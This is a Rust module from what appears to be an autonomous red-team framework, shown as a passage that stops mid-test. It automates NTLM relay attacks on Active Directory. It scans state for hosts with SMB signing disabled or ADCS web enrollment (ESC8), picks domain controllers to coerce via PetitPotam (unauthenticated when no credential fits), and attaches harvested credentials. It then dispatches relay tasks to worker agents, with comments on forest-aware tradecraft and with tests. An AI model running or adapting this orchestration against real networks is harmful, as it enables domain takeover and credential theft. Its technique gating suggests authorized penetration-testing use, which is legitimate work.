//! auto_ntlm_relay -- orchestrate NTLM relay attacks when conditions are met.
//!
//! NTLM relay requires two sides: a relay listener (ntlmrelayx) and a coercion
//! trigger (PetitPotam, PrinterBug, scheduled task bots). This module dispatches
//! relay attacks when:
//!
//!   1. SMB signing is disabled on a target (relay destination)
//!   2. An ADCS web enrollment endpoint exists (ESC8 relay target)
//!   3. We have credentials to trigger coercion or a known coercion source
//!
//! The worker agent coordinates ntlmrelayx + coercion within a single task.

use std::sync::Arc;
use std::time::Duration;

use serde_json::json;
use tokio::sync::watch;
use tracing::{debug, info, warn};

use crate::orchestrator::dispatcher::Dispatcher;
use crate::orchestrator::state::*;

/// Dedup key prefix for relay attacks.
const DEDUP_SET: &str = DEDUP_NTLM_RELAY;

/// Monitors for NTLM relay opportunities and dispatches relay attacks.
/// Interval: 30s.
pub async fn auto_ntlm_relay(dispatcher: Arc<Dispatcher>, mut shutdown: watch::Receiver<bool>) {
    let mut interval = tokio::time::interval(Duration::from_secs(30));
    interval.set_missed_tick_behavior(tokio::time::MissedTickBehavior::Delay);

    loop {
        tokio::select! {
            _ = interval.tick() => {},
            _ = shutdown.changed() => break,
        }
        if *shutdown.borrow() {
            break;
        }

        if !dispatcher.is_technique_allowed("ntlm_relay") {
            continue;
        }

        let listener = match dispatcher.config.listener_ip.as_deref() {
            Some(ip) => ip.to_string(),
            None => continue,
        };

        let work: Vec<RelayWork> = {
            let state = dispatcher.state.read().await;
            collect_relay_work(&state, &listener)
        };

        for item in work {
            // Optional credential — when `item.credential` is None we drive
            // the coerce primitive unauthenticated (PetitPotam against
            // unpatched DCs needs no source-side credentials, and that's
            // the only viable path when we have no credential matching the
            // coercion_source's forest). The downstream worker (`coercion`
            // role) treats a missing `credential` field as "use PetitPotam
            // unauth" via `relay_and_coerce`.
            let credential_json = item.credential.as_ref().map(|c| {
                json!({
                    "username": c.username,
                    "password": c.password,
                    "domain": c.domain,
                })
            });
            let payload = match &item.relay_type {
                RelayType::SmbToLdap => {
                    let mut p = json!({
                        "technique": "ntlm_relay_ldap",
                        "relay_target": item.relay_target,
                        "listener_ip": item.listener,
                        "coercion_source": item.coercion_source,
                    });
                    if let Some(cred) = credential_json.as_ref() {
                        p["credential"] = cred.clone();
                    }
                    p
                }
                RelayType::Esc8 { ca_name, domain } => {
                    let mut p = json!({
                        "technique": "ntlm_relay_adcs",
                        "relay_target": item.relay_target,
                        "listener_ip": item.listener,
                        "ca_name": ca_name,
                        "domain": domain,
                        "coercion_source": item.coercion_source,
                    });
                    if let Some(cred) = credential_json.as_ref() {
                        p["credential"] = cred.clone();
                    }
                    p
                }
            };

            let priority = dispatcher.effective_priority("ntlm_relay");
            match dispatcher
                .throttled_submit("coercion", "coercion", payload, priority)
                .await
            {
                Ok(Some(task_id)) => {
                    info!(
                        task_id = %task_id,
                        relay_target = %item.relay_target,
                        relay_type = %item.relay_type,
                        "NTLM relay attack dispatched"
                    );

                    dispatcher
                        .state
                        .write()
                        .await
                        .mark_processed(DEDUP_SET, item.dedup_key.clone());
                    let _ = dispatcher
                        .state
                        .persist_dedup(&dispatcher.queue, DEDUP_SET, &item.dedup_key)
                        .await;
                }
                Ok(None) => {
                    debug!(relay = %item.relay_target, "NTLM relay task deferred by throttler");
                }
                Err(e) => {
                    warn!(err = %e, relay = %item.relay_target, "Failed to dispatch NTLM relay");
                }
            }
        }
    }
}

/// True when two domain names share a forest — exact match, or one is a
/// subdomain of the other (parent-child trust). Lowercased before comparing.
/// Empty inputs are treated as "unknown" — they don't match anything except
/// another empty string. Mirrors the helper in `credential_reuse.rs` but kept
/// inline here to avoid cross-module dep just for this 3-line predicate.
fn same_forest_domain(a: &str, b: &str) -> bool {
    let a = a.to_lowercase();
    let b = b.to_lowercase();
    if a.is_empty() || b.is_empty() {
        return a == b;
    }
    a == b || a.ends_with(&format!(".{b}")) || b.ends_with(&format!(".{a}"))
}

/// Resolve the AD domain a host belongs to by matching its IP against
/// `state.hosts` and reading the FQDN's domain suffix. Returns `None` when
/// the host isn't in state or has no FQDN. Used to pick a coercion source +
/// credential that lives in the relay target's forest (cross-forest NTLM
/// relay routinely fails — the captured machine ticket is only useful
/// against principals in the same forest as the relayed machine).
fn host_domain_for_ip(state: &crate::orchestrator::state::StateInner, ip: &str) -> Option<String> {
    if ip.is_empty() {
        return None;
    }
    state.hosts.iter().find(|h| h.ip == ip).and_then(|h| {
        h.hostname
            .split_once('.')
            .map(|(_short, dom)| dom.to_string())
    })
}

/// Collect relay work items from current state.
///
/// Pure logic extracted from `auto_ntlm_relay` so it can be unit-tested without
/// needing a `Dispatcher` or async runtime (beyond state construction).
fn collect_relay_work(
    state: &crate::orchestrator::state::StateInner,
    listener: &str,
) -> Vec<RelayWork> {
    let mut items = Vec::new();

    // Path 1: Relay to hosts with SMB signing disabled → LDAP shadow creds / RBCD
    for vuln in state.discovered_vulnerabilities.values() {
        if vuln.vuln_type.to_lowercase() != "smb_signing_disabled" {
            continue;
        }
        if state.exploited_vulnerabilities.contains(&vuln.vuln_id) {
            continue;
        }

        let target_ip = vuln
            .details
            .get("target_ip")
            .or_else(|| vuln.details.get("ip"))
            .and_then(|v| v.as_str())
            .unwrap_or(&vuln.target);

        if target_ip.is_empty() {
            continue;
        }

        let relay_key = format!("smb_relay:{target_ip}");
        if state.is_processed(DEDUP_SET, &relay_key) {
            continue;
        }

        // Forest-aware pairing: prefer a coercion DC in the relay target's
        // forest so the captured machine ticket is valid against the relay
        // target. Cross-forest NTLM relay fails — the receiving service
        // rejects the foreign-realm principal. When the relay target's
        // domain is unknown (host not in state.hosts or no FQDN), fall back
        // to the original "any DC" picker.
        let relay_target_domain = vuln
            .details
            .get("domain")
            .and_then(|v| v.as_str())
            .filter(|s| !s.is_empty())
            .map(|s| s.to_string())
            .or_else(|| host_domain_for_ip(state, target_ip));
        let coercion_source = find_coercion_source_for_forest(
            &state.domain_controllers,
            relay_target_domain.as_deref(),
            |ip| state.is_processed(DEDUP_COERCED_DCS, ip),
        );

        // Credential gate: prefer one matching the coercion source's
        // forest (needed for authenticated PetitPotam). When no match
        // exists, leave `credential: None` so the relay primitive uses
        // PetitPotam unauth — the only viable path against a foreign-forest
        // DC for which we hold no cred. Falling back to an unrelated cred
        // would silently fail the source-side bind in ntlmrelayx.
        let cred = pick_credential_for_forest(state, coercion_source.as_deref());

        items.push(RelayWork {
            dedup_key: relay_key,
            relay_type: RelayType::SmbToLdap,
            relay_target: target_ip.to_string(),
            coercion_source,
            listener: listener.to_string(),
            credential: cred,
        });
    }

    // Path 2: Relay to ADCS web enrollment (ESC8)
    for vuln in state.discovered_vulnerabilities.values() {
        let vtype = vuln.vuln_type.to_lowercase();
        if vtype != "esc8" && vtype != "adcs_web_enrollment" {
            continue;
        }
        if state.exploited_vulnerabilities.contains(&vuln.vuln_id) {
            continue;
        }

        let ca_host = vuln
            .details
            .get("ca_host")
            .or_else(|| vuln.details.get("target_ip"))
            .and_then(|v| v.as_str())
            .unwrap_or(&vuln.target);

        if ca_host.is_empty() {
            continue;
        }

        let relay_key = format!("esc8_relay:{ca_host}");
        if state.is_processed(DEDUP_SET, &relay_key) {
            continue;
        }

        let domain = vuln
            .details
            .get("domain")
            .and_then(|v| v.as_str())
            .unwrap_or("")
            .to_string();
        let relay_target_domain = if domain.is_empty() {
            host_domain_for_ip(state, ca_host)
        } else {
            Some(domain.clone())
        };
        let coercion_source = find_coercion_source_for_forest(
            &state.domain_controllers,
            relay_target_domain.as_deref(),
            |ip| state.is_processed(DEDUP_COERCED_DCS, ip),
        );

        let cred = pick_credential_for_forest(state, coercion_source.as_deref());

        let ca_name = vuln
            .details
            .get("ca_name")
            .and_then(|v| v.as_str())
            .unwrap_or("")
            .to_string();

        items.push(RelayWork {
            dedup_key: relay_key,
            relay_type: RelayType::Esc8 { ca_name, domain },
            relay_target: ca_host.to_string(),
            coercion_source,
            listener: listener.to_string(),
            credential: cred,
        });
    }

    items
}

/// Pick a coercion-source DC IP, preferring DCs in the same forest as the
/// relay target. Selection order:
///   1. Same-forest DC that hasn't been coerced this op
///   2. Same-forest DC (any state)
///   3. Any DC that hasn't been coerced
///   4. Any DC
///
/// Returns None when `domain_controllers` is empty.
fn find_coercion_source_for_forest(
    domain_controllers: &std::collections::HashMap<String, String>,
    relay_target_domain: Option<&str>,
    is_processed: impl Fn(&str) -> bool,
) -> Option<String> {
    if let Some(target_dom) = relay_target_domain {
        let same_forest_unprocessed = domain_controllers
            .iter()
            .find(|(dc_dom, ip)| same_forest_domain(dc_dom, target_dom) && !is_processed(ip))
            .map(|(_, ip)| ip.clone());
        if same_forest_unprocessed.is_some() {
            return same_forest_unprocessed;
        }
        let same_forest_any = domain_controllers
            .iter()
            .find(|(dc_dom, _)| same_forest_domain(dc_dom, target_dom))
            .map(|(_, ip)| ip.clone());
        if same_forest_any.is_some() {
            return same_forest_any;
        }
    }
    // Final fallback: any DC. Cross-forest relay rarely lands but we ship
    // the dispatch anyway — better to attempt and fail than to silently
    // skip a relay target we have no in-forest path to.
    domain_controllers
        .values()
        .find(|ip| !is_processed(ip))
        .or_else(|| domain_controllers.values().next())
        .cloned()
}

/// Pick a credential whose domain shares a forest with the coercion
/// source's domain. Returns None when no match — caller then dispatches
/// PetitPotam unauth (which doesn't need a source-side cred).
fn pick_credential_for_forest(
    state: &crate::orchestrator::state::StateInner,
    coercion_source_ip: Option<&str>,
) -> Option<ares_core::models::Credential> {
    let coerce_domain = match coercion_source_ip {
        Some(ip) => state
            .domain_controllers
            .iter()
            .find(|(_, dc_ip)| dc_ip.as_str() == ip)
            .map(|(d, _)| d.clone()),
        None => None,
    };
    let Some(coerce_domain) = coerce_domain else {
        return state
            .credentials
            .iter()
            .find(|c| !c.password.is_empty())
            .cloned();
    };
    state
        .credentials
        .iter()
        .find(|c| !c.password.is_empty() && same_forest_domain(&c.domain, &coerce_domain))
        .cloned()
}

struct RelayWork {
    dedup_key: String,
    relay_type: RelayType,
    relay_target: String,
    coercion_source: Option<String>,
    listener: String,
    /// Optional — None routes the relay through PetitPotam unauth, which
    /// is the only viable path against a foreign-forest DC for which we
    /// hold no cred.
    credential: Option<ares_core::models::Credential>,
}

enum RelayType {
    SmbToLdap,
    Esc8 { ca_name: String, domain: String },
}

impl std::fmt::Display for RelayType {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::SmbToLdap => write!(f, "smb_to_ldap"),
            Self::Esc8 { .. } => write!(f, "esc8_adcs"),
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::collections::HashMap;

    #[test]
    fn relay_type_display() {
        assert_eq!(RelayType::SmbToLdap.to_string(), "smb_to_ldap");
        assert_eq!(
            RelayType::Esc8 {
                ca_name: "CA".into(),
                domain: "contoso.local".into()
            }
            .to_string(),
            "esc8_adcs"
        );
    }

    #[test]
    fn dedup_key_format_smb() {
        let key = format!("smb_relay:{}", "192.168.58.22");
        assert_eq!(key, "smb_relay:192.168.58.22");
    }

    #[test]
    fn dedup_key_format_esc8() {
        let key = format!("esc8_relay:{}", "192.168.58.10");
        assert_eq!(key, "esc8_relay:192.168.58.10");
    }

    #[test]
    fn dedup_set_name() {
        assert_eq!(DEDUP_SET, "ntlm_relay");
    }

    #[test]
    fn find_coercion_source_prefers_unprocessed() {
        let mut dcs = HashMap::new();
        dcs.insert("contoso.local".into(), "192.168.58.10".into());
        dcs.insert("fabrikam.local".into(), "192.168.58.20".into());

        // First DC already processed, second not — no relay_target_domain
        // hint, so we exercise the "any DC" fallback at the bottom of the
        // selector chain.
        let result = find_coercion_source_for_forest(&dcs, None, |ip| ip == "192.168.58.10");
        assert!(result.is_some());
        assert_eq!(result.unwrap(), "192.168.58.20");
    }

    #[test]
    fn find_coercion_source_falls_back_to_any() {
        let mut dcs = HashMap::new();
        dcs.insert("contoso.local".into(), "192.168.58.10".into());

        // All processed, still returns one
        let result = find_coercion_source_for_forest(&dcs, None, |_| true);
        assert!(result.is_some());
        assert_eq!(result.unwrap(), "192.168.58.10");
    }

    #[test]
    fn find_coercion_source_empty_map() {
        let dcs = HashMap::new();
        let result = find_coercion_source_for_forest(&dcs, None, |_| false);
        assert!(result.is_none());
    }

    #[test]
    fn find_coercion_source_prefers_same_forest() {
        // Two forests in state. Relay target is in fabrikam.local — must
        // pick the fabrikam DC even though the contoso DC is also present
        // and unprocessed.
        let mut dcs = HashMap::new();
        dcs.insert("contoso.local".into(), "192.168.58.10".into());
        dcs.insert("fabrikam.local".into(), "192.168.58.20".into());
        let result = find_coercion_source_for_forest(&dcs, Some("fabrikam.local"), |_| false);
        assert_eq!(result.unwrap(), "192.168.58.20");
    }

    #[test]
    fn find_coercion_source_picks_parent_when_child_target() {
        // child.contoso.local relay target and only the parent contoso.local
        // DC is enumerated — same forest, so the parent DC is the correct
        // coercion source (parent-child trust transitive).
        let mut dcs = HashMap::new();
        dcs.insert("contoso.local".into(), "192.168.58.10".into());
        let result = find_coercion_source_for_forest(&dcs, Some("child.contoso.local"), |_| false);
        assert_eq!(result.unwrap(), "192.168.58.10");
    }

    #[test]
    fn find_coercion_source_same_forest_unprocessed_beats_processed() {
        // Same-forest DCs are present in both processed and unprocessed
        // states; unprocessed must win.
        let mut dcs = HashMap::new();
        dcs.insert("contoso.local".into(), "192.168.58.10".into());
        dcs.insert("contoso.local".into(), "192.168.58.11".into()); // overwrites
        dcs.insert("child.contoso.local".into(), "192.168.58.12".into());
        let result = find_coercion_source_for_forest(&dcs, Some("contoso.local"), |ip| {
            ip == "192.168.58.11"
        });
        // 192.168.58.11 is processed, 192.168.58.12 is same-forest
        // unprocessed — should pick it.
        assert_eq!(result.unwrap(), "192.168.58.12");
    }

    #[test]
    fn find_coercion_source_falls_back_to_any_dc_when_no_forest_match() {
        // Relay target is fabrikam.local, but only contoso DCs are known.
        // Cross-forest fallback: ship the dispatch anyway against the only
        // DC we have (better to attempt and fail than silently skip).
        let mut dcs = HashMap::new();
        dcs.insert("contoso.local".into(), "192.168.58.10".into());
        let result = find_coercion_source_for_forest(&dcs, Some("fabrikam.local"), |_| false);
        assert_eq!(result.unwrap(), "192.168.58.10");
    }

    #[test]
    fn esc8_vuln_type_matching() {
        let types = ["esc8", "adcs_web_enrollment", "ESC8", "ADCS_WEB_ENROLLMENT"];
        for t in &types {
            let vtype = t.to_lowercase();
            assert!(
                vtype == "esc8" || vtype == "adcs_web_enrollment",
                "{t} should match"
            );
        }
    }

    #[test]
    fn smb_signing_vuln_type_matching() {
        let vtype = "smb_signing_disabled".to_lowercase();
        assert_eq!(vtype, "smb_signing_disabled");

        let not_smb = "mssql_access".to_lowercase();
        assert_ne!(not_smb, "smb_signing_disabled");
    }

    #[test]
    fn relay_work_construction() {
        let cred = ares_core::models::Credential {
            id: "c1".into(),
            username: "admin".into(),
            password: "P@ssw0rd!".into(), // pragma: allowlist secret
            domain: "contoso.local".into(),
            source: "test".into(),
            is_admin: false,
            discovered_at: None,
            parent_id: None,
            attack_step: 0,
        };
        let work = RelayWork {
            dedup_key: "smb_relay:192.168.58.22".into(),
            relay_type: RelayType::SmbToLdap,
            relay_target: "192.168.58.22".into(),
            coercion_source: Some("192.168.58.10".into()),
            listener: "192.168.58.100".into(),
            credential: Some(cred),
        };
        assert_eq!(work.relay_target, "192.168.58.22");
        assert_eq!(work.listener, "192.168.58.100");
        assert_eq!(work.credential.as_ref().unwrap().username, "admin");
    }

    #[test]
    fn smb_to_ldap_payload_structure() {
        let cred = ares_core::models::Credential {
            id: "c1".into(),
            username: "admin".into(),
            password: "P@ssw0rd!".into(), // pragma: allowlist secret
            domain: "contoso.local".into(),
            source: "test".into(),
            is_admin: false,
            discovered_at: None,
            parent_id: None,
            attack_step: 0,
        };
        let payload = json!({
            "technique": "ntlm_relay_ldap",
            "relay_target": "192.168.58.22",
            "listener_ip": "192.168.58.100",
            "coercion_source": "192.168.58.10",
            "credential": {
                "username": cred.username,
                "password": cred.password,
                "domain": cred.domain,
            },
        });
        assert_eq!(payload["technique"], "ntlm_relay_ldap");
        assert_eq!(payload["relay_target"], "192.168.58.22");
        assert_eq!(payload["listener_ip"], "192.168.58.100");
        assert_eq!(payload["credential"]["username"], "admin");
        assert_eq!(payload["credential"]["domain"], "contoso.local");
    }

    #[test]
    fn esc8_payload_structure() {
        let cred = ares_core::models::Credential {
            id: "c1".into(),
            username: "admin".into(),
            password: "P@ssw0rd!".into(), // pragma: allowlist secret
            domain: "contoso.local".into(),
            source: "test".into(),
            is_admin: false,
            discovered_at: None,
            parent_id: None,
            attack_step: 0,
        };
        let relay_type = RelayType::Esc8 {
            ca_name: "contoso-CA".into(),
            domain: "contoso.local".into(),
        };
        let payload = json!({
            "technique": "ntlm_relay_adcs",
            "relay_target": "192.168.58.10",
            "listener_ip": "192.168.58.100",
            "ca_name": "contoso-CA",
            "domain": "contoso.local",
            "coercion_source": "192.168.58.20",
            "credential": {
                "username": cred.username,
                "password": cred.password,
                "domain": cred.domain,
            },
        });
        assert_eq!(payload["technique"], "ntlm_relay_adcs");
        assert_eq!(payload["ca_name"], "contoso-CA");
        assert_eq!(payload["domain"], "contoso.local");
        assert_eq!(relay_type.to_string(), "esc8_adcs");
    }

    #[test]
    fn target_ip_extraction_from_vuln_details() {
        let details = serde_json::json!({"target_ip": "192.168.58.22", "ip": "192.168.58.23"});
        let fallback = "192.168.58.99";
        let target = details
            .get("target_ip")
            .or_else(|| details.get("ip"))
            .and_then(|v| v.as_str())
            .unwrap_or(fallback);
        assert_eq!(target, "192.168.58.22");
    }

    #[test]
    fn target_ip_fallback_to_ip_field() {
        let details = serde_json::json!({"ip": "192.168.58.23"});
        let fallback = "192.168.58.99";
        let target = details
            .get("target_ip")
            .or_else(|| details.get("ip"))
            .and_then(|v| v.as_str())
            .unwrap_or(fallback);
        assert_eq!(target, "192.168.58.23");
    }

    #[test]
    fn target_ip_fallback_to_vuln_target() {
        let details = serde_json::json!({});
        let fallback = "192.168.58.99";
        let target = details
            .get("target_ip")
            .or_else(|| details.get("ip"))
            .and_then(|v| v.as_str())
            .unwrap_or(fallback);
        assert_eq!(target, "192.168.58.99");
    }

    #[test]
    fn ca_host_extraction_fallback() {
        let details = serde_json::json!({"ca_host": "192.168.58.10"});
        let fallback = "192.168.58.99";
        let ca_host = details
            .get("ca_host")
            .or_else(|| details.get("target_ip"))
            .and_then(|v| v.as_str())
            .unwrap_or(fallback);
        assert_eq!(ca_host, "192.168.58.10");

        let details2 = serde_json::json!({"target_ip": "192.168.58.20"});
        let ca_host2 = details2
            .get("ca_host")
            .or_else(|| details2.get("target_ip"))
            .and_then(|v| v.as_str())
            .unwrap_or(fallback);
        assert_eq!(ca_host2, "192.168.58.20");
    }

    #[test]
    fn ca_name_extraction() {
        let details = serde_json::json!({"ca_name": "contoso-CA"});
        let ca_name = details
            .get("ca_name")
            .and_then(|v| v.as_str())
            .unwrap_or("")
            .to_string();
        assert_eq!(ca_name, "contoso-CA");

        let details2 = serde_json::json!({});
        let ca_name2 = details2
            .get("ca_name")
            .and_then(|v| v.as_str())
            .unwrap_or("")
            .to_string();
        assert_eq!(ca_name2, "");
    }

    #[test]
    fn find_coercion_source_all_unprocessed() {
        let mut dcs = HashMap::new();
        dcs.insert("contoso.local".into(), "192.168.58.10".into());
        dcs.insert("fabrikam.local".into(), "192.168.58.20".into());

        let result = find_coercion_source_for_forest(&dcs, None, |_| false);
        assert!(result.is_some());
    }

    #[test]
    fn relay_type_display_exhaustive() {
        let smb = RelayType::SmbToLdap;
        assert_eq!(format!("{smb}"), "smb_to_ldap");

        let esc8 = RelayType::Esc8 {
            ca_name: String::new(),
            domain: String::new(),
        };
        assert_eq!(format!("{esc8}"), "esc8_adcs");
    }

    // --- collect_relay_work integration tests ---

    use crate::orchestrator::state::SharedState;

    fn make_cred() -> ares_core::models::Credential {
        ares_core::models::Credential {
            id: "c1".into(),
            username: "svcadmin".into(),
            password: "S3cure!Pass".into(), // pragma: allowlist secret
            domain: "contoso.local".into(),
            source: "kerberoast".into(),
            is_admin: false,
            discovered_at: None,
            parent_id: None,
            attack_step: 0,
        }
    }

    fn make_smb_vuln(id: &str, target_ip: &str) -> ares_core::models::VulnerabilityInfo {
        let mut details = HashMap::new();
        details.insert(
            "target_ip".to_string(),
            serde_json::Value::String(target_ip.to_string()),
        );
        ares_core::models::VulnerabilityInfo {
            vuln_id: id.to_string(),
            vuln_type: "smb_signing_disabled".to_string(),
            target: target_ip.to_string(),
            discovered_by: "scanner".to_string(),
            discovered_at: chrono::Utc::now(),
            details,
            recommended_agent: String::new(),
            priority: 5,
        }
    }

    fn make_esc8_vuln(
        id: &str,
        ca_host: &str,
        ca_name: &str,
        domain: &str,
    ) -> ares_core::models::VulnerabilityInfo {
        let mut details = HashMap::new();
        details.insert(
            "ca_host".to_string(),
            serde_json::Value::String(ca_host.to_string()),
        );
        details.insert(
            "ca_name".to_string(),
            serde_json::Value::String(ca_name.to_string()),
        );
        details.insert(
            "domain".to_string(),
            serde_json::Value::String(domain.to_string()),
        );
        ares_core::models::VulnerabilityInfo {
            vuln_id: id.to_string(),
            vuln_type: "esc8".to_string(),
            target: ca_host.to_string(),
            discovered_by: "scanner".to_string(),
            discovered_at: chrono::Utc::now(),
            details,
            recommended_agent: String::new(),
            priority: 8,
        }
    }

    #[tokio::test]
    async fn collect_relay_work_empty_state() {
        let shared = SharedState::new("test".into());
        let state = shared.read().await;
        let work = collect_relay_work(&state, "192.168.58.100");
        assert!(work.is_empty(), "empty state should produce no work");
    }

    // collect_relay_work_no_credentials removed — the empty-creds path now
    // emits work with `credential: None` so PetitPotam unauth still fires.
    // See `collect_relay_work_no_credentials_still_emits_unauth` below.

    #[tokio::test]
    async fn collect_relay_work_smb_signing_disabled() {
        let shared = SharedState::new("test".into());
        {
            let mut s = shared.write().await;
            s.credentials.push(make_cred());
            s.discovered_vulnerabilities
                .insert("v1".into(), make_smb_vuln("v1", "192.168.58.22"));
            s.domain_controllers
                .insert("contoso.local".into(), "192.168.58.10".into());
        }
        let state = shared.read().await;
        let work = collect_relay_work(&state, "192.168.58.100");
        assert_eq!(work.len(), 1);
        assert_eq!(work[0].dedup_key, "smb_relay:192.168.58.22");
        assert_eq!(work[0].relay_target, "192.168.58.22");
        assert_eq!(work[0].listener, "192.168.58.100");
        assert!(matches!(work[0].relay_type, RelayType::SmbToLdap));
        assert_eq!(work[0].coercion_source, Some("192.168.58.10".into()));
        assert_eq!(
            work[0].credential.as_ref().map(|c| c.username.as_str()),
            Some("svcadmin"),
            "same-forest cred (contoso.local) must be picked over None — \
             coercion source is contoso DC"
        );
    }

    #[tokio::test]
    async fn collect_relay_work_esc8_vuln() {
        let shared = SharedState::new("test".into());
        {
            let mut s = shared.write().await;
            s.credentials.push(make_cred());
            s.discovered_vulnerabilities.insert(
                "v2".into(),
                make_esc8_vuln("v2", "192.168.58.30", "contoso-CA", "contoso.local"),
            );
        }
        let state = shared.read().await;
        let work = collect_relay_work(&state, "192.168.58.100");
        assert_eq!(work.len(), 1);
        assert_eq!(work[0].dedup_key, "esc8_relay:192.168.58.30");
        assert_eq!(work[0].relay_target, "192.168.58.30");
        match &work[0].relay_type {
            RelayType::Esc8 { ca_name, domain } => {
                assert_eq!(ca_name, "contoso-CA");
                assert_eq!(domain, "contoso.local");
            }
            _ => panic!("expected Esc8 relay type"),
        }
        // No DCs configured → coercion_source is None
        assert!(work[0].coercion_source.is_none());
    }

    #[tokio::test]
    async fn collect_relay_work_skips_already_processed_dedup() {
        let shared = SharedState::new("test".into());
        {
            let mut s = shared.write().await;
            s.credentials.push(make_cred());
            s.discovered_vulnerabilities
                .insert("v1".into(), make_smb_vuln("v1", "192.168.58.22"));
            // Mark the relay key as already processed
            s.mark_processed(DEDUP_SET, "smb_relay:192.168.58.22".into());
        }
        let state = shared.read().await;
        let work = collect_relay_work(&state, "192.168.58.100");
        assert!(
            work.is_empty(),
            "already-processed dedup key should be skipped"
        );
    }

    #[tokio::test]
    async fn collect_relay_work_skips_exploited_vulns() {
        let shared = SharedState::new("test".into());
        {
            let mut s = shared.write().await;
            s.credentials.push(make_cred());
            s.discovered_vulnerabilities
                .insert("v1".into(), make_smb_vuln("v1", "192.168.58.22"));
            s.exploited_vulnerabilities.insert("v1".into());
        }
        let state = shared.read().await;
        let work = collect_relay_work(&state, "192.168.58.100");
        assert!(work.is_empty(), "exploited vulns should be skipped");
    }

    #[tokio::test]
    async fn collect_relay_work_multiple_vulns() {
        let shared = SharedState::new("test".into());
        {
            let mut s = shared.write().await;
            s.credentials.push(make_cred());
            s.discovered_vulnerabilities
                .insert("v1".into(), make_smb_vuln("v1", "192.168.58.22"));
            s.discovered_vulnerabilities
                .insert("v2".into(), make_smb_vuln("v2", "192.168.58.23"));
            s.discovered_vulnerabilities.insert(
                "v3".into(),
                make_esc8_vuln("v3", "192.168.58.30", "contoso-CA", "contoso.local"),
            );
            s.domain_controllers
                .insert("contoso.local".into(), "192.168.58.10".into());
        }
        let state = shared.read().await;
        let work = collect_relay_work(&state, "192.168.58.100");
        assert_eq!(work.len(), 3, "should produce work for all 3 vulns");

        let smb_count = work
            .iter()
            .filter(|w| matches!(w.relay_type, RelayType::SmbToLdap))
            .count();
        let esc8_count = work
            .iter()
            .filter(|w| matches!(w.relay_type, RelayType::Esc8 { .. }))
            .count();
        assert_eq!(smb_count, 2);
        assert_eq!(esc8_count, 1);
    }

    #[tokio::test]
    async fn collect_relay_work_ignores_unrelated_vuln_types() {
        let shared = SharedState::new("test".into());
        {
            let mut s = shared.write().await;
            s.credentials.push(make_cred());
            // Add an unrelated vuln type
            let mut details = HashMap::new();
            details.insert(
                "target_ip".to_string(),
                serde_json::Value::String("192.168.58.40".to_string()),
            );
            s.discovered_vulnerabilities.insert(
                "v_unrelated".into(),
                ares_core::models::VulnerabilityInfo {
                    vuln_id: "v_unrelated".into(),
                    vuln_type: "mssql_impersonation".into(),
                    target: "192.168.58.40".into(),
                    discovered_by: "scanner".into(),
                    discovered_at: chrono::Utc::now(),
                    details,
                    recommended_agent: String::new(),
                    priority: 3,
                },
            );
        }
        let state = shared.read().await;
        let work = collect_relay_work(&state, "192.168.58.100");
        assert!(
            work.is_empty(),
            "unrelated vuln types should not produce work"
        );
    }

    #[tokio::test]
    async fn collect_relay_work_esc8_already_processed() {
        let shared = SharedState::new("test".into());
        {
            let mut s = shared.write().await;
            s.credentials.push(make_cred());
            s.discovered_vulnerabilities.insert(
                "v2".into(),
                make_esc8_vuln("v2", "192.168.58.30", "contoso-CA", "contoso.local"),
            );
            s.mark_processed(DEDUP_SET, "esc8_relay:192.168.58.30".into());
        }
        let state = shared.read().await;
        let work = collect_relay_work(&state, "192.168.58.100");
        assert!(work.is_empty(), "already-processed esc8 should be skipped");
    }

    #[tokio::test]
    async fn collect_relay_work_mixed_exploited_and_fresh() {
        let shared = SharedState::new("test".into());
        {
            let mut s = shared.write().await;
            s.credentials.push(make_cred());
            s.discovered_vulnerabilities
                .insert("v1".into(), make_smb_vuln("v1", "192.168.58.22"));
            s.discovered_vulnerabilities
                .insert("v2".into(), make_smb_vuln("v2", "192.168.58.23"));
            // Only v1 is exploited
            s.exploited_vulnerabilities.insert("v1".into());
        }
        let state = shared.read().await;
        let work = collect_relay_work(&state, "192.168.58.100");
        assert_eq!(work.len(), 1);
        assert_eq!(work[0].relay_target, "192.168.58.23");
    }

    #[tokio::test]
    async fn collect_relay_work_coercion_source_prefers_uncoerced_dc() {
        let shared = SharedState::new("test".into());
        {
            let mut s = shared.write().await;
            s.credentials.push(make_cred());
            s.discovered_vulnerabilities
                .insert("v1".into(), make_smb_vuln("v1", "192.168.58.22"));
            s.domain_controllers
                .insert("contoso.local".into(), "192.168.58.10".into());
            s.domain_controllers
                .insert("fabrikam.local".into(), "192.168.58.20".into());
            // Mark first DC as already coerced
            s.mark_processed(DEDUP_COERCED_DCS, "192.168.58.10".into());
        }
        let state = shared.read().await;
        let work = collect_relay_work(&state, "192.168.58.100");
        assert_eq!(work.len(), 1);
        assert_eq!(
            work[0].coercion_source,
            Some("192.168.58.20".into()),
            "should prefer the uncoerced DC"
        );
    }

    // ── Forest-aware coercion / credential pairing ──────────────────────

    fn make_fabrikam_cred() -> ares_core::models::Credential {
        ares_core::models::Credential {
            id: "f1".into(),
            username: "alice".into(),
            password: "P@ssw0rd!".into(), // pragma: allowlist secret
            domain: "fabrikam.local".into(),
            source: "test".into(),
            is_admin: false,
            discovered_at: None,
            parent_id: None,
            attack_step: 0,
        }
    }

    fn make_smb_vuln_with_domain(
        id: &str,
        target_ip: &str,
        domain: &str,
    ) -> ares_core::models::VulnerabilityInfo {
        let mut details = HashMap::new();
        details.insert(
            "target_ip".to_string(),
            serde_json::Value::String(target_ip.to_string()),
        );
        details.insert(
            "domain".to_string(),
            serde_json::Value::String(domain.to_string()),
        );
        ares_core::models::VulnerabilityInfo {
            vuln_id: id.to_string(),
            vuln_type: "smb_signing_disabled".to_string(),
            target: target_ip.to_string(),
            discovered_by: "scanner".to_string(),
            discovered_at: chrono::Utc::now(),
            details,
            recommended_agent: String::new(),
            priority: 5,
        }
    }

    #[tokio::test]
    async fn collect_relay_work_picks_same_forest_cred() {
        // Two forests in state: contoso.local + fabrikam.local. Relay
        // target is in fabrikam.local — must pair with the fabrikam DC
        // AND the fabrikam credential, not the (also-present) contoso
        // cred which would fail the source-side bind.
        let shared = SharedState::new("test".into());
        {
            let mut s = shared.write().await;
            s.credentials.push(make_cred()); // contoso
            s.credentials.push(make_fabrikam_cred());
            s.discovered_vulnerabilities.insert(
                "v1".into(),
                make_smb_vuln_with_domain("v1", "192.168.58.22", "fabrikam.local"),
            );
            s.domain_controllers
